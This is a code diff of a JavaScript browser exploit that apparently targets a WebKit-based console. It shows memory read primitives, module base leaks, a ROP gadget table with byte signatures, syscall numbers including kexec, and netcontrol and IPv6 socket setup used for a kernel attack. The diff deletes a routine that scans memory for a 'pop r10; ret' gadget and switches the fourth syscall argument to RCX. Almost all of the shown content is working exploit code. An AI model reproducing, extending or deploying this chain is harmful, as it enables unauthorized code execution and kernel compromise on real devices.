@@ -1,6 +1,4 @@
-// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
-// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
-// virgin instance, pinning ~137 MB for the life of the page.
+// ?v=10 must match mem.js's specifier EXACTLY
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus, readInto } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -13,9 +11,7 @@ let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
-function post(tag, detail) {
-    // Reenviado por el observer del HTML
-}
+function post(tag, detail) { }
 
 const VERBOSE = params.get("verbose") === "1";
 const PROSE = [
@@ -71,13 +67,8 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
 
               ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
 
-// ══════════════════════════════════════════════════════════════════════
-//  EVENTOS DE NETCONTROL (13.02/13.04)
-//  Según sub_9E0230: compara a2 contra 0x1000000000 y 0x800000000
-//  y exige a4 == 4. Van en int64 para no truncarse a 32 bits.
-// ══════════════════════════════════════════════════════════════════════
-const NETEVENT_SET_QUEUE   = new int64(0, 0x10);  // 0x1000000000
-const NETEVENT_CLEAR_QUEUE = new int64(0, 0x8);   // 0x800000000
+const NETEVENT_SET_QUEUE   = new int64(0, 0x10);
+const NETEVENT_CLEAR_QUEUE = new int64(0, 0x8);
 
 const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
@@ -181,6 +172,7 @@ let allDone = false;
         });
 
         const PAIR_ON = params.get("pair") === "1" || true;
+        // SWEEP desactivado por defecto para ahorrar ~48 MB pico
         const SWEEP_CYCLES = params.has("sweep")
             ? parseInt(params.get("sweep"), 10) : 0;
         const SWEEP_MS = params.has("sweepms")
@@ -234,59 +226,12 @@ let allDone = false;
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
-        // ══════════════════════════════════════════════════════════════
-        //  AUTO-DETECCIÓN DEL GADGET "pop r10; ret" (41 5A C3)
-        // ══════════════════════════════════════════════════════════════
-        function findPopR10(base, size) {
-            const CHUNK = 0x4000;
-            const buf = new Uint8Array(CHUNK + 2);
-            for (let off = 0; off < size; off += CHUNK) {
-                const n = Math.min(CHUNK + 2, size - off);
-                try { readInto(buf, base.add32(off), n); }
-                catch (e) { continue; }
-                for (let i = 0; i < n - 2; i++) {
-                    if (buf[i] !== 0x41 || buf[i+1] !== 0x5a || buf[i+2] !== 0xc3)
-                        continue;
-                    // Descartar si el byte anterior es prefijo REX
-                    let prevByte;
-                    if (i > 0) prevByte = buf[i-1];
-                    else if (off > 0) {
-                        try { prevByte = p.read1(base.add32(off - 1)); }
-                        catch (e) { prevByte = 0; }
-                    } else prevByte = 0;
-                    if (prevByte >= 0x48 && prevByte <= 0x4f) continue;
-                    return off + i;
-                }
-            }
-            return -1;
-        }
-
-        if (typeof off.wk_POP_R10_RET !== "number" || off.wk_POP_R10_RET === 0) {
-            state("scanning for pop r10...", "warn");
-            const rva = findPopR10(webkitBase, 0x4000000);
-            if (rva >= 0) {
-                off.wk_POP_R10_RET = rva;
-                mark("POP_R10-FOUND", "rva=0x" + rva.toString(16)
-                    + " bytes=" + [p.read1(webkitBase.add32(rva)),
-                                   p.read1(webkitBase.add32(rva + 1)),
-                                   p.read1(webkitBase.add32(rva + 2))]
-                        .map(b => b.toString(16).padStart(2, "0")).join(" "));
-            } else {
-                mark("POP_R10-NOTFOUND", "scan failed");
-                throw new Error("could not find pop r10 gadget");
-            }
-        }
-
-        // ══════════════════════════════════════════════════════════════
-        //  GADGET TABLE (ahora incluye POP_R10_RET)
-        // ══════════════════════════════════════════════════════════════
         const G = {};
         const GAD = [
             ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
             ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
             ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
             ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
-            ["POP_R10_RET", off.wk_POP_R10_RET, [0x41, 0x5a, 0xc3]], // NUEVO
             ["POP_R8_RET",  off.wk_POP_R8_RET,  [null, 0x58, 0xc3]],
             ["POP_R9_RET",  off.wk_POP_R9_RET,  [null, 0x59, 0xc3]],
             ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
@@ -312,9 +257,9 @@ let allDone = false;
         if (!check("gadget-table-fits-module", gated === GAD.length,
             gated + "/" + GAD.length)) return;
 
-        // 4º argumento va en R10 (System V)
+        // argGadget ORIGINAL (sin POP_R10)
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
-                           G.POP_R10_RET, G.POP_R8_RET, G.POP_R9_RET];
+                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
 
         const stubAddr = new Map();
         let seeded = 0;
@@ -470,9 +415,7 @@ let allDone = false;
             return got;
         }
 
-        // ══════════════════════════════════════════════════════════════
-        //  NETCONTROL — a1=0, a4=4, eventos int64
-        // ══════════════════════════════════════════════════════════════
+        // NETCONTROL: a1=0, a4=4, eventos int64
         function netevent(sock, event) {
             argDv.setUint32(0, sock >>> 0, true);
             const r = sc(SYS.netcontrol, 0, event, argAddr, 4).i32;
